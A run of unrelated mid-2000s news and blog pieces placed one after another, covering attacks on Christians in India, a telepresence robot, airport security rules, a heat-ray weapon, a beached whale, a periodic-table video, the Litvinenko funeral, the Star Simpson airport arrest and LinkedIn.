The militants , whose names the police did not disclose , charged that the Christians – identified only as Raghu from Emmanuel Church , Prabhu from Zion Church and an independent pastor , Anand – were forcibly converting local Hindus , George said in published remarks .
The Christians have denied the charges .
DALIT BEATEN
Last month , Pastor Emmanuel Venketesh , 38 , who is of Dalit origin , was also attacked for apparently similar reasons by Hindu militants during a prayer meeting in a house of one of his church members in the ‘ Raji nagar Malur ’ area .
Dalits are often seen as the ‘ lowest caste ’ in India ’s ancient system of Hinduism .
" While the prayer and worship was progressing , [ up to ] 25 Hindu activists of the Sangh Parivar [ group ] started beating the pastor and others indiscriminately for an hour , " the GCIC said .
Another believer , identified as Venkettarajappa , 36 , was allegedly stabbed in his hand and hip during the skirmish while a woman , MS Thimmakka , " was beaten and injured on her leg and face , " the GCIC said .
All the three Christians required hospital treatment , the GCIC said .
Police reluctantly agreed to investigate the attack , the GCIC added .
It comes as Christian educational institutions in Karnataka have also complained of visits by secret service agents and security forces for allegedly hosting groups with links to violent Communists .
In one of the latest " very controversial " incidents , " intelligence agents came to the famous St. Joseph ’s College in [ the city of ]
Bangalore , among others , " September 2 , said George , who has denied the charges .
The GCIC has linked the attacks to concern among Hindu groups and authorities about the spread of Christianity .
However Karnataka is not the only state where Hindu-militants and authorities have increased pressure on Christians , rights observers say .
MORE INCIDENTS
In other recent reported incidents :
– Hindu extremists in Bhihar state stormed a Christian meeting , forcibly taking a pastor to a temple and making him recite slogans about Hindu god Rama on September 8 in the Bankipore Gorakh area of Fatuha in the Patna area , news reports said .
– Six families in Natungram village , Murshidabad district in the state of West Bengal , were being " ostracized for converting to Christianity from Islam , " reported the Mumbai Mirror newspaper on September 7 in a report monitored by Compass Direct News .
– Elsewhere in West Bengal alleged supporters of the Communist Party of India - Marxists ( CPI - M ) reportedly beat the wife of an independent Christian worker , Biman Patro , on September 1 in Bhupathinagar area of East Midnapore district .
– In the state of Madhya Pradesh a Hindu militants from the Bajrang Dal group in Kharra village , Rewa district , allegedly beat a 24 - year - old Christian , Kailash Saket , for expressing his
faith in Christ on August 31 , the GCIC said in a published statement .
– In Orissa state suspected Hindu militants reportedly demolished an 18 - year - old building of the Evangelical Lutheran Church ( JELC ) , belonging to tribal Christians on August 25 in Banjalaput village .
MAHARASTHRA STATE
The situation was not much better in Maharashtra state where young Hindu militants on August 25 allegedly launched a second attack on 38 - year - old pastor Peter David Silway from the Vineyard Workers ’ Church in Dapodi area of district .
Pastor Silway conducts healing prayer meetings on Saturdays that draw nearly 20,000 people , Compass Direct News said .
Also in Maharashtra , Pastor Edward Pais in Mumbai is under police investigation after Hindu militants last month accused him of " forcible conversion " during a baptism ceremony .
There is growing concern among human rights groups that life for Christians is becoming increasingly difficult in India , a mainly Hindu nation of 1.1 billion people .
The upcoming rally , September 22 , is another attempt to highlight persecution of Christians , GCIC President George suggested to BosNewsLife .
( With reporting from India ) .
IvanAnywhere does n't look like much , but the robot devised by Ivan Bowman makes remote working and interacting with his colleagues much easier , says Matt Walcoff
The following correction was printed in the Guardian 's Corrections and clarifications column , Wednesday September 19 2007
The standfirst above said IvanAnywhere was devised by Ivan Bowman .
Although Mr Bowman uses the robot , it was constructed by his colleague Ian McHardy , as the article made clear .
Ivan Bowman spends his days as a programmer at iAnywhere Solutions in Waterloo , Ontario , in much the same way his colleagues do .
He writes code , exchanges notes in other developers ' offices , attends meetings and hangs out in the kitchen over coffee .
About the only thing he can't do is drink the coffee - or touch anything , for that matter .
It 's not that Bowman does n't have hands or a mouth ; they 're just in Halifax , Nova Scotia , along with the rest of his body , about 840 miles ( 1,350 km ) away .
In fact , it 's not really Bowman in the Waterloo office at all .
It 's IvanAnywhere , a robot Bowman uses to interact with his colleagues in Waterloo from his home office .
" Robot " is a bit of a stretch , actually .
IvanAnywhere is basically a coat rack on wheels with attached speakers , camera and touchscreen computer which displays a live shot of Bowman 's face from his living room in Nova Scotia .
Doppelganger
But in the three months since IvanAnywhere went online , he has become such a normal part of the third floor at iAnywhere that co-workers barely even notice they 're talking to a machine .
" We are all so used to Ivan , they do n't even give it a second thought , " says Glenn Paulley , Bowman 's boss and the originator of the IvanAnywhere idea .
When Bowman has a question for a colleague , he does n't pick up the phone ; he uses his joystick to drive his doppelganger to the team member 's office .
If Paulley needs Bowman 's time on a software issue , he calls IvanAnywhere to his office , just as he would with any other employee .
For his part , Bowman uses IvanAnywhere to take part in meetings , even giving presentations with the help of a projector .
Every once in a while , he 'll motor to the floor 's lounge area to look out the window and chat with passersby , much as he would if he were in Waterloo .
Bowman has worked for the Canadian database software company since 1993 .
Five years ago , when his wife got a job in Halifax , his employers allowed him to follow her east and telecommute .
But although Bowman could type out code as well there as he could in Waterloo , he was missing out on the personal give - and - take essential to the flow of ideas .
" We were , and we still operate really as , a small software development team where a lot of the collaboration happens face - to - face , " Paulley says .
" When it comes to coming up with an idea , we 're almost always in each other 's offices . "
IvanAnywhere emerged through a sort of digital evolution .
At first , Bowman tried participating in meetings via speakerphone , but suffered from the inability to see his colleagues or what they were scribbling on the whiteboard .
Colleagues set up a webcam with a speaker , which they kept in a corner of the office most of the day ; it proved to be just as frustrating for Bowman .
" I could hear people in the kitchen talking about something , and occasionally I would have something I wanted to add to that , and not being there in person , I could n't do anything .
I had to wait for them to come over to the desk . "
The solution to the restraints of telecommuting - and Ivan 's genesis - began as a whimsical conversation Paulley had with programmer Ian McHardy two years ago after seeing a television ad for a remote - control toy blimp .
" My first thought to Ian was , ' Would n't it be cool if we could string a webcam to the bottom of a blimp , and Ivan would be able to float wherever he wanted , ' " Paulley says .
Everyone had a good laugh .
And then McHardy pointed out that while a blimp would leak and crash into things , a robot might suit the task .
Over the following months , the programmers would bring up the robot idea again when Bowman 's absence was causing difficulties .
Eventually , Paulley and McHardy began seriously considering whether it would work .
Finally , McHardy , who toys with radio - controlled vehicles as a hobby , mounted a webcam , screen and speakers on a radio - controlled truck last winter , creating the first IvanAnywhere prototype .
The model racer did n't turn out to be an appropriate base : it was too short and accelerated too quickly .
" The thing would , like , take off like a bat out of hell , " Paulley says .
But the prototype proved that a robot could be controlled remotely via the internet with an ordinary webcam for vision .
McHardy spent some time over the next few months researching " telepresence " , the academic term for systems that allow people to feel as if they are in a remote location .
He read about other telepresence projects , such as robots designed at the University of Toronto for hospitalised schoolchildren to attend classes virtually ( ryerson.ca/ pebbles ) and a French - made touchscreen on wheels that serves as a robot tour guide ( laas.fr , PDF ) .
Battery - powered
McHardy found a mobile base with wheels and 24 - volt motors sold by SuperDroid Robots , a US - based company .
He placed a cardboard box on top containing enough batteries to power the robot for the working day ( they need daily recharging ) , and the wires and gadgetry needed to convert digital instructions to analogue controls .
Infrared proximity sensors are meant to prevent the machine from hitting the walls - although Ivan does still crash into a door frame now and then .
A simple aluminum bar almost two metres high sticks up from the base , with the webcam , screen and speakers wrapped on below .
McHardy 's only concession to aesthetics is a grey foam ball stuck on the robot 's top .
Paulley 's screen , voice and controls all work via Wi -Fi connectivity to the internet .
And in the " flesh " ?
Being charitable , IvanAnywhere is far more impressive technically than visually .
With his exposed wires , masking tape and plastic ties IvanAnywhere makes Robby , the robot from Forbidden Planet , look like Optimus Prime .
But Paulley points out that IvanAnywhere is a strictly utilitarian creation : " The goal is not to make Ivan look like the haunted robot that walks and talks , " he says .
" The idea is to give Ivan a physical presence in the building . "
The robot 's coming - out party came at a co-worker 's anniversary celebration in late May .
Some iAnywhere employees who had not been privy to IvanAnywhere 's development were shocked to find a computer - on - a - stick hobnobbing with the guests .
" There were a few people who thought this was just freaky , " Paulley says .
" They were a little taken aback and did n't quite believe themselves that this was actually Ivan , and he was actually there . "
But as more people heard about the robot on Paulley 's team , the third floor became a stop on building tours .
The city mayor , university president and local MP have all visited to chat with Bowman .
Overlooked charges
Like the other employees on the floor , IvanAnywhere has his own office of sorts , a notch behind a cubicle with some batteries and a sign reminding the last person in the office to plug the robot in to recharge it before leaving - which they have forgotten at least once .
" I was wandering the halls at night looking for somebody to plug me in , " Bowman says .
IvanAnywhere has never left the building , but there 's no reason why he can't travel ; the robot can work anywhere with wireless internet access .
Bowman says he would like to attend the next barbecue at Paulley 's house , although the team has yet to devise a way for him to be able to eat hot dogs remotely .
Meanwhile , other telecommuting employees at iAnywhere , a subsidiary of Sybase , have expressed interest in getting their own robots , Paulley says .
In the future , iAnywhere may look less like a software company and more like an episode of Futurama .

WASHINGTON , July 19 — Federal aviation authorities have decided to stop enforcing a two - year - old rule against taking cigarette lighters on airplanes , concluding that it was a waste of time to search for them before passengers boarded .
The ban was imposed at the insistence of Congress after a passenger , Richard Reid , tried to ignite a bomb in his shoe in 2001 on a flight from Paris to Miami .
Lawmakers said that if Mr. Reid had used a lighter , instead of matches , he might have been able to ignite the bomb , but Kip Hawley , assistant secretary for the Transportation Security Administration , said in an interview on Thursday that the ban had done little to improve aviation security because small batteries could be used to set off a bomb .
Matches have never been prohibited on flights .
“ Taking lighters away is security theater , ” Mr. Hawley said .
“ It trivializes the security process . ”
The gun uses a large dish mounted on a Humvee vehicle
Called the Active Denial System , it projects an invisible high energy beam that produces a sudden burning feeling .
Military officials , who say the gun is harmless , believe it could be used as a non-lethal way of making enemies surrender their weapons .
Officials said there was wide - ranging military interest in the technology .
" This is a breakthrough technology that 's going to give our forces a capability they do n't now have , " defence official Theodore Barna told Reuters news agency .
" We expect the services to add it to their tool kit .
And that could happen as early as 2010 . "
' Blast from an oven '
The prototype weapon was demonstrated at the Moody Air Force Base in Georgia .
A beam was fired from a large rectangular dish mounted on a Humvee vehicle .
The beam has a reach of up to 500 m ( 550 yds ) , much further than existing non-lethal weapons like rubber bullets .
It can penetrate clothes , suddenly heating up the skin of anyone in its path to 50C .
But it penetrates the skin only to a tiny depth - enough to cause discomfort but no lasting harm , according to the military .
A Reuters journalist who volunteered to be shot with the beam described the sensation as similar to a blast from a very hot oven - too painful to bear without diving for cover .
Crowd control
Military officials said the weapon was one of the key technologies of the future .
" Non-lethal weapons are important for the escalation of force , especially in the environments our forces are operating in , " said Marine Col Kirk Hymes , director of the development programme .
The weapon could potentially be used for dispersing hostile crowds in conflict zones such as Iraq or Afghanistan .
It would mean that troops could take effective steps to move people along without resorting to measures such as rubber bullets - bridging the gap between " shouting and shooting " , Col Hymes said .
A similar " non-lethal " weapon , Silent Guardian , is being developed by US company Raytheon .
Ron Paul won big earlier today in Alabama .
He also won big in New Hampshire this afternoon .

Head of the Humpback Living in Alaska provides plenty of opportunities for new experiences :
Hiking through old - growth rainforests ; viewing grizzlies in the wild ; walking across ancient rivers of glacial ice .
But it is only on rare occasion - even for Alaskans - that one gets the chance to behead a beached whale .
When I was invited along on this gruesome expedition it was like winning the wildlife lottery from hell .
In August 2004 , a 28 - ton juvenile humpback was struck by one of the many large barges and cruise ships that travel up Gastineau Channel to Juneau .
After the National Marine Fisheries Service completed its necropsy , a friend of mine working for the Alaska Department of Fish and Game got permission to recover the skeleton .
He planned to display it at Juneau - Douglas High School , making it the first exhibit of its kind in the capital city .
We would start by removing the skull .
The plan was to cut through the neck , remove the head and anchor it to the bottom of the channel where fish and crabs would devour the flesh .
Only about 10 feet of blubber and guts stood in our way , but we had knives .
Mine was a butcher knife brought from home .
Riley , my Fish and Game buddy , planned to return the following summer to recover the rest of the bones after nature had taken its course .
Ironically , the carcass had washed up near the community of Lucky Me , just south of Juneau on Douglas Island .
The sun was out the day we set sail and the wind was blowing hard as our boat pulled up to the rocky beach where the 28 - foot - long beast lay on its side .
The stench hit me hard , pulling up that morning 's breakfast into my esophagus .
It was horrific , like nothing I had ever experienced .
Riley - a hunter , wildlife enthusiast and true Alaska man - dove right in , shaving chunks of blubber from the rotting mammal while the rest of the members of the five - man crew struggled to keep from puking in our paper facemasks .
After taking a moment to steady my stomach , I climbed onto the beast and began hacking away furiously , ripping off putrid flesh and tossing it to the side .
A friend and colleague who also chronicled the experience for the local newspaper described me as appearing " angry in [ my ] knifework . "
The hide of the whale was tough like a car tire .
It had already spent a week or so baking in the sun and oil and puss oozed from its lacerations .
Some crewmembers expressed concern that the natural buildup of gas trapped inside the whale could cause it to explode .
At the time I wondered if this was an urban myth or if one misplaced jab of the knife would be my undoing .
I later discovered that gas buildup caused a 60 - ton beached sperm whale to blow up in Taiwan about seven months prior to our expedition .
Workers were transporting the 56 - foot - long whale to a research facility in Tainin when it erupted , raining blood and guts on bystanders and storefronts .
Luckily , our whale remained intact .
We spent most of the afternoon coaxing one another to act like men and finish the job , but several of us , myself included , were losing hope that we could complete the task .
" How could this be so difficult ? " I thought .
I had seen video footage of Alaska Natives dismantling whales twice the size of this one with surgical precision in less than a day .
But I was no Alaska Native and eventually we realized were in way over our heads .
Riley has returned several times over the last year and a half , recovering about 65 percent of the skeleton to date , but the skull , which weighs in at about 300 pounds , will remain on the beach until he can find a vessel large enough to carry it back to the mainland .
He said he plans to return this spring to finish the job .
In the days following our excursion I realized I would never again see whales simply as beautiful and majestic mammoths of the sea , flapping their flukes and breaching for our amusement .
A mural of a humpback outside a bakery in Juneau evoked images of death .
The foul odor of decomposing entrails still returns to me in nightmares .
And almost two years later , I cannot think of whales without pondering our harrowing experience and being reminded that all life - from the colossal to the microscopic , the majestic to the grotesque - is fragile and finite .
And it stinks .

Posted on April 12 , 2006
A little hobby of mine is collecting and photographing the chemical elements .
I have them all ( except those that break the laws of man or physics ) .
This is the photographic periodic table poster I sell :
My poster and related imagery can be seen in several TV shows , and most recently staff at the venerable NOVA science series emailed asking for permission to use my poster image in an upcoming show about metals .
They wanted to pan and zoom over it , starting wide and then focusing down onto a few individual elements .
I said , “ Fine , but I have something I think you ’ll like even better …
How about a video where every one of those samples is rotating in place ? ”
And here is that video .
What does any of this have to do with Mathematica ?
That video , and the more complex ones below , are directly output from Mathematica without any processing in traditional video editing tools .
Why did I use Mathematica rather than standard video or image editing tools ( which I have and use routinely for other things ) ?
Because Mathematica is the only tool I know in which it would not have been severely painful .
I ’m busy — I can only make a video like this if I can do it with a minimal amount of labor , because studying elements is my hobby , not my full - time job .
The raw material is made up of 42,480 individual 8 - megapixel still frames created on a turntable rig ( 118 elements times 360 frames per element ) .
These 42,480 shots need to be assembled into a periodic table grid with appropriate text and grid lines overlaid .
Think about doing that 360 times in Adobe Photoshop ( I have done it , once , for the poster ) .
Yes , you could script it , but that would be painful .
Think about doing it by first creating 118 individual element videos , then assembling them in Final Cut Pro .
Yes , you could do it , but that , too , would be painful .
Very painful .
But the real killer is if you want to zoom far in like the folks at NOVA wanted to , from the full table down to where an individual element fills the whole screen :
The problem with doing this move in a video editing system is that in order to have the fully zoomed version be perfectly sharp , you ’d have to start with an extremely high - resolution version of the original video .
If you want to zoom to where a single element fills the height of a 1080 p high - definition resolution video frame , the full table would be 18,000 x 9,000 pixels .
The world has not yet evolved to the point where 162 - megapixel video editing is commonplace .
Or any place .
When I offered to supply the video at that resolution , their response was to say that their video suite would just laugh at such a file , which is pretty much what I was expecting .
No , the only practical alternative , if you want to avoid the horrible compromise of doing the move over a single high - resolution frame , rather than a rotating video , is to assemble the frames at the target resolution one by one , picking just the images you need at the resolution you need based on the position and zoom level .
When you ’re at wide zoom there are many images , but they are all small .
When you ’re in tight , the images are large , but there are n’t very many of them .
Doing this in Mathematica is quite straightforward , once you get over the mental block of thinking Mathematica is just a math program .
I used Import to read in JPEG files of the necessary images .
( I have them stored at four different resolutions : 1000 , 400 , 150 and 65 pixels square ; the code automatically picks the next higher resolution based on the destination size of the image . )
Then I constructed a Graphics object with the imported images placed as Raster objects .
The text for each element tile is placed using Inset , with drop shadows constructed by duplicating the text multiple times shifted over slightly with transparency added .
The fully assembled frame is then exported with Export .
To do the moves ( pan and zoom motions ) I used a simple Bezier spline interpolation to make smooth starts and stops .
This is all rather straightforward Mathematica programming — only about a hundred lines in all , including the code to do drop shadows on text , assemble each element tile , arrange them in the standard periodic table layout and do all the Import and Export .
Given this hundred lines of composite image assembly code , the instructions to create the specific sequence of pans and zooms NOVA wanted , according to their explicit timing specifications , is this :
The result of running this code ( which takes about six hours on my laptop to generate 1,095 high - definition frames ) is a directory full of JPEG ( or TARGA , which is what they wanted ) files , ready to assemble into QuickTime or another video format .
You could , in theory , Export the finished movie rather than the individual frames directly from Mathematica , but that ’s not what the NOVA people wanted , and it ’s actually more convenient to work with individual frame files .
For example , you can generate them out of order to spot - check that it ’s going to fit together , or run multiple copies of Mathematica to generate different sets at the same time .
When the NOVA staff decided to switch from bismuth ( Bi ) to lead ( Pb ) as the final target , it was a one - character change , then I hit Shift - Return .
Nice .
While we were at it , I hit Shift - Return to generate this variation , which loops back and forth between carbon and silver , two of my favorite rotating samples :
In a world without Mathematica , this kind of thing would be done using either code in a language like C or Java ( if you had a programmer and a few weeks handy ) or , quite painfully , using scripting languages in some photo , video or page layout programs .
Actually , the truth is that it simply would n’t have gotten done at all :
They would have done the pan and zoom over a single , non-rotating still frame of the whole table .
This is going to be maybe 30 seconds in a documentary ; there ’s no budget for anything like what I ’m describing .
In this case the project was possible only because Mathematica exists and I know how to use it , and therefore could do the project in an afternoon or two while at the same time creating a general tool that I ’ll be able to use for other variations ( and a nifty blog post ) .
This is an example of the payoff you get from learning Mathematica .
You probably would n’t start using it in order to make periodic table videos , but once you know it and are comfortable with the range of things it can do , you ’re constantly surprised at what random project ideas suddenly seem more doable .
The most satisfying thing was when , after sending yet another draft rendering , I finally got the email asking , “ Um … how exactly are you doing that ? ”
Mr Litvinenko's father Walter arrives at a mosque to pray for his son
His wife , son and parents attended North London 's Highgate Cemetery , where an imam said an " unscheduled " prayer .
The former KGB agent 's death on 23 November , in London , has been linked to the radioactive isotope polonium - 210 .
Meanwhile , Russia is investigating the attempted murder of Mr Litvinenko 's contact Dmitry Kovtun .
A lawyer known to the ex-spy said he was not very ill .
' Unfortunate detraction '
Mr Litvinenko's coffin , a dark - stained Jacobean oak Garratt casket , was supposed to be laid to rest in a strictly non-denominational ceremony .
But after Mr Litvinenko's father Walter had spoken at his graveside - watched by Mr Litvinenko 's wife Marina and the couple 's son Anatoly - an Islamic associate of his Chechen friend Ahmed Zakayev interrupted and performed a Muslim prayer .
Earlier , mourners , including Mr Litvinenko's father had joined Muslims for midday prayers at the Central London mosque in Regent 's Park , where a funeral reading was given .
Alex Goldfarb , one of the former spy 's closest friends , described it as an " unfortunate detraction " .
He said : " It was supposed to be a non-religious , non-denominational ceremony according to the wishes of the widow . "
Radiation concerns
Chechen separatist Zakayev , who was a friend of Mr Litvinenko , had also attended the reading , along with exiled Russian billionaire Boris Berezovsky and filmmaker Andrei Nekrasov .
Mosque representative Ghayasuddin Siddiqui said Mr Litvinenko's body could not be brought to the mosque .
Mr Zakayev had said earlier this week the body would not be taken to the mosque because of concerns about the radiation it contained .
Mr Litvinenko's father had said earlier this week that his son had requested before his death to be buried according to Muslim tradition .
But his closest friends said they had " strong reservations " about the suggestion .
After the burial service , a " solemn and dignified " memorial service was held in a private function room in Lauderdale House on the other side of Waterlow Park .
Poisoning
Mr Kovtun met Mr Litvinenko at the Millennium Hotel in Grosvenor Square , London , on 1 November .
Hours later Mr Litvinenko fell ill .
Russia 's Interfax news agency said Mr Kovtun fell into a coma after being questioned by Russian investigators and Scotland Yard detectives .
" By the doctors ' diagnosis , Kovtun 's condition is critical , " the agency said .
However , Andrew Romashov , a lawyer , said Mr Kovtun 's condition had not deteriorated since he met the prosecutors .
" Kovtun 's condition is satisfactory , " he said , dismissing the earlier reports as " provocation " .
Earlier , Russian prosecutors said they were investigating what they are treating as the murder of Mr Litvinenko and the attempted murder of Mr Kovtun .
A statement from the prosecutor 's office said checks had established Mr Litvinenko died as a result of poisoning from a radioactive substance .
It said Mr Kovtun had suffered an illness connected to poisoning by a radioactive substance .
In another development British authorities played down the risk to health after small traces of a radioactive substance were found at the British embassy in Moscow following a precautionary check .
Officials said the levels of radiation found would not pose a risk to public health .
In London , Scotland Yard confirmed it was treating Mr Litvinenko 's death as murder .
" It is important to stress that we have reached no conclusions as to the means employed , the motive or the identity of those who might be responsible for Mr Litvinenko's death , " a statement said .
The British embassy announced on 4 December it would test one of its rooms as a precaution , after former KGB bodyguard Andrei Lugovoi visited the building to deny any involvement in the poisoning of Mr Litvinenko , 43 .
Mr Lugovoi and Mr Kovtun reportedly met Mr Litvinenko at the Millennium Hotel .
Mr Lugovoi is also expected to be interviewed in Moscow .
Restrictions
Russian officials are expected to conduct the interview but British detectives will be in attendance .
Nine Metropolitan police officers are currently in Moscow but have had restrictions placed on their investigations into Mr Litvinenko 's death by the authorities .
Russia 's chief prosecutor , Yuri Chaika , said British officers could not arrest Russian citizens and suspects would not be extradited to Britain .
Tests have been carried out at a number of venues Mr Litvinenko visited in London on that day .
Earlier , Mario Scaramella , the Italian academic who also met Mr Litvinenko on 1 November - at a sushi bar - was discharged from hospital in London .
Mr Scaramella was under observation after testing positive for polonium - 210 .
Friends believe Mr Litvinenko was poisoned because of his criticisms of the Russian government , but the Kremlin has dismissed suggestions it was involved in any way as " sheer nonsense " .

A little over a week ago , the MIT campus found itself in the midst of a firestorm of media coverage surrounding an MIT student who was arrested at Boston 's Logan Airport wearing a " device " which reporters and police have been calling a " fake " or " hoax bomb . "
This story cut close to home because the student in question , Star Simpson , had lived for a time in East Campus , a dorm which is right next door to Senior House ( where I live ) .
During the course of that first weekend , I had people on all sides of the controversy wanting me to make a public statement to students about what happened , each convinced that I would side with them .
I have been reluctant to do so -- not wanting anything I said here to get absorbed into the media circus surrounding this case .
My own sense is that both the government officials and the MIT administration issued statements prematurely without really understanding what went on and why and that the result was to inflame the news media .
To get a sense of how this story got covered by television news , you might check out this video produced by one MIT student and circulated on YouTube .
The clips here suggest the glee with which reporters linked MIT , terrorism , bombs , and machine guns together to produce a story calculated to hit the hot buttons of their listeners .
Joshua Glenn over at Boston.com provided a useful overview of some of the conflicting claims being made about this student .
Here 's a sample :
" Bringing a fake bomb into Logan Airport gives new meaning to the term sophomoric behavior . "
Maybe Star Anna Simpson thought she could saunter through Logan and return to Cambridge with a helluva tale about how no one said a word to her .
Or maybe she thought a half - dozen machine guns would do wonders for her Web site profile . "
" It was stupid of her to do it , but let 's not get hysterical .
Give her community service and let 's be done with this before we make a mockery of ourselves again . "
" Simpson appears to be a classic case of book - smart but not social - smart . "
The initial reports suggested a student whose behavior in the words of the official MIT statement was " reckless . "
Many of those in the know here initially assumed that this was some kind of " hack " ( an MIT term for practical joke ) which was in bad taste and which might have had fatal results .
A very different story emerged when you considered some of the reports produced by web - based reporters and circulated through sites like Boing Boing and the Machinist .
Here , Star Simpson comes across as a more typical MIT student , who was very much into a low tech aesthetic , making devices from found materials .
Indeed , these reports are far more consistent with what I have been hearing from students who knew Star Simpson and they are consistent with the culture of East Campus , the dorm where she used to live , which has a long - standing tradition of do - it - yourself technology and construction projects .
The so - called " hoax bomb " turns out to be a name tag featuring a star logo ( for her name ) made out of lite brites .
Many of us immediately linked the official responses to this lite - brite name badge back to what is now recognized as a over - reaction to a series of similarly low tech signs for The Cartoon Network 's Aqua Teen Hunger Force last January , an incident still produces divergent responses depending on which side of a generational divide you fall .
In both cases , the city responded to its own hysteria by charging the people involved with producing a " hoax bomb . "
Surely , the issue of intentionality is involved here .
One has to consciously seek to deceive someone in order to be involved in committing a hoax , which does n't seem to have been the case in either incident .
My own theory is that it is much easier to accept that someone has made a fool of you than to acknowledge that you have made a fool of yourself within incidents which center around misunderstandings or misinterpretations of visual evidence .
If you look at the pictures of the device , it takes a big stretch of the imagination to view what she was wearing as resembling any kind of functioning weapon .
Trust me -- if a MIT student wanted to create something which could be confused for a bomb , they could do so with a high degree of accuracy .
This does n't come anywhere close , witness the fact that she has reportedly worn this thing on our campus many times and no one has confused it for a bomb .
It might never have crossed her mind that anyone could confuse this for a bomb -- in part because
our students have a more intimate understanding of how technology works than the average airport security guard does .
Some of my friends in the MIT administration have urged me to use my influence with students to warn them that it is not appropriate to play games or do hacks at the Logan Airport , which , after all , needs to be on hyper - alert because it was the site where the airplanes took off on 9/11 .
So let me be clear : I do n't think it would be appropriate for any student to intentionally seek to deceive an airport official into believing that they were wearing a bomb or carrying a weapon .
The news media has compared the incident to making jokes about bombs or guns in the security line at the airport .
I certainly agree that such behavior would be grossly inappropriate and dangerous , but is that really what happened here ?
Star Simpson may have been guilty of nothing more than wearing a name badge that security guards mistook for a bomb .
So , how do I help students to predict what security guards are apt to mistake for a bomb ?
Ignorance of the law is no excuse , but under our constitutional system , it has to be theoretically possible to predict what would constitute criminal behavior .
So , given the two incidents , it would seem that the police have a strong anxiety about lite - brites .
Police have also found it suspicious that Simpson was playing with Playdough in the airport .
Would Playdough by itself be sufficient to trigger a police response ?
If so , we should probably be warning parents of small children .
Some have stressed the anxiety created by the circuit board .
But many of our students carry around notebooks made from recycled circuit boards which are sold in college bookstores around the country .
Should I tell them not to carry such devices to the airport ?
The news media made much of the fact that this device lite up and was powered by a battery .
This left me concerned since my late mother used to wear a broach to holiday parties which looked like a Christmas tree , lite up , and was battery powered .
A star is not that removed from a Christmas tree , after all .
Would such a device have been read as a bomb in the current climate ?
Or would the fact that it was being worn by a seventy something church lady have led to a different response ?
My assumption is that if Star had worn a similarly mass produced , high tech device with the same features and functions , it would not have provoked concern from airport officials .
It was the low tech , DIY nature of her name tag , perhaps more than anything else , which sparked the reactions of the airport security force , perhaps because the actual terrorists make use of similarly low tech devices .
Yet , many at MIT have embraced low tech in part as a reaction to the cult of high tech which is so often associated with our institution , seeking a return to basic materials , hand crafting , simple and appropriate technologies , and so forth .
So , what is it that I warn my students against carrying to the airport ?
Please do n't think I am making light of this situation .
This is not a joking matter .
Students should err on the side of caution .
As citizens , we should be concerned that airport security take every reasonable precaution to insure the safety of passengers , but we should also be concerned by some of the almost lethal misunderstandings we are hearing about these days .
One of the things that struck me in the news coverage of the incident was the frequency with which reporters described the security force as " taking no chances " in their response to Star .
Media scholars have noted the ways that seemingly objective terms can create bias in news coverage .
For example often , in covering strikes , management makes " offers " and labor makes " demands , " even though both are involved in a process of back and forth negotiation .
This language slants our perspective on which is the " reasonable " party and provides a script through which we make sense of labor politics .
In this case , the police " took no chances " if you assume that Star was either wearing a bomb or trying to trick someone into believing she was armed .
But if we consider that police pulled machine guns on an unarmed 19 year old in a public place , then we might think that they took a fair number of chances .
I personally read the incident against the backdrop of a growing number of recent reports of students being tasered by campus police or for that matter , news stories which suggest campus police are now increasingly carrying weapons in reaction to the Virginia Tech incident .
To me , this suggests that police are " taking chances " on a regular basis , especially given their apparent inability to make meaningful distinctions in responding to unfamiliar technologies or icons .
The news media -- and perhaps the police -- expressed initially confusion about the words on her black hoodie , " Socket To Me / COURSE VI . " " ; these phrases referred to her electrical engineering major ( majors go by numbers in the MIT context ) but were read with sinister associations by at least some of the initial news reports .
How many of us wear equally cryptic symbols on our T - shirts , unawares , when we go to the airport ?
I certainly saw plenty of shirts I did n't fully understand when I passed through Logan just last night returning from a speaking gig .
Another thing that struck me looking back on this incident was the difference in the ways the mainstream media and the blogsophere sought to cover this story .
The mainstream media sent reporters to the MIT campus who beseiged anyone walking in or out of the East Campus dorm .
Keep in mind that the dorm has several hundred residents , most of whom did n't know Star Simpson .
I lived across the street from her and to the best of my knowledge have never met her .
The blog reporters tapped social network sites -- followed her Facebook links , tracked down her home page , and understood something of the cultural context within which she produced the name tag .
We should n't be surprised that those immersed in new media understood how to locate and interpret the kinds of traces any college age student leaves on line , where - as the mainstream news reporters were following tried and true but also hit or miss methods which were unlikely to give them any real insight into who this student was .
If the mainstream news media showed limited media literacy skills in their handling of this particular story , I was proud of the ways that the incident got discussed within the context of MIT dorm discussion lists .
Students showed initial skepticism of the sensational reporting they were seeing , especially when it was clear that the reporters showed so little understanding of their culture and their lives .
They shared and dissected news reports .
They sought out alternative information on their own , pooling knowledge to try to understand what took place and why .
While the temptation was to rally around an accused fellow student ( and that 's where most of them ended up ) , there were some who were willing to play devil 's advocate and question the evidence to make sure that they were not guilty of the same kinds of rush to judgment that they were seeing all around them .
This was a classic example of collective intelligence at work .
I do n't know for sure what happened that day at Logan Airport .
There are some nagging details that do n't quite add up no matter how I look at the story .
But it is pretty clear that there was a significant misunderstanding involved here , that the news media did n't consider alternative framings of the incident and that they were more invested in frightening the public than in finding out what actually occurred .
The title of this post suggests the kind of mental drama that many of those involved in the incident were following -- the Movie of the Week sagas which might pit a mislead American youth against heroic airport guards fighting to protect our homeland security , perhaps even the cold war dramas about communists in our midst .
I just hope we have room in our heads to consider other possibilities .
Sometimes I get it .
Often I get it .
This time , though , I do n’t get it .
About four weeks ago , I received an invitation from a friend to join her ‘ Linked In network ’ .
I ’m always interested in finding out about social software , so with a devil - may - care attitude I signed up , linked to my friend , and thought nothing of it .
Until the next day I received a second invitation .
A few days later , a third .
The next thing I know I ’m racking up a decent list of connections .
Kind of fun .
Quotes from the site told me that a lot of very successful people in powerful positions were Linked In .
Students at big names schools were LinkedIn .
I was part of the in crowd .
I was important .
At my fingertips was a powerful network of people , very likely in suits and ties , and who had large brains , who were just waiting to help me .
Help me do what ?
What exactly does Linked In do ?
My home page tells me that there are 38 people at the university I work at who are linked in .
Am I supposed to invite them to my network ?
I ’m told that I can find old class mates , but if I wanted to do that I would have clicked on one of those annoying popup ads with pictures of people with big hair .
My home page also tells me that my network is 55 percent complete .
What does that mean ?
What happens when it ’s 100 percent complete ?
Do I get a promotion ?
Do I learn secret handshakes ?
Do I go to Harvard ?
I ’ve picked up 526 people in my network sine July 6th , most of them in my third tier .
I might pass some of them on the street , but we ’d never know it .
I do n’t even know the names of people in my third tier .
Am I supposed to send them a card ?
Some flowers ?
And what is this business about not being recommended ?
LinkedIn is telling me that nobody has recommended me .
There is a nice little application where I can request friends to come in and validate me .
I ’m insecure enough in the real world , now I ’m getting pressure from the online one ?
Articles I ’ve read say LinkedIn is a great way to get recommendations .
